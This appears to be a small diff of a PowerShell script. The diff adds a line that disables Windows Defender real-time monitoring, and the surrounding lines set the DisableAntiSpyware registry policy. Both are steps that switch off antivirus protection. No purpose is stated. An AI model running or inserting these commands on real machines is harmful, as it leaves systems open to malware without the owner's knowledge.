@@ -1,3 +1,4 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
 $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 $Name = "DisableAntiSpyware"
 $value = "1"
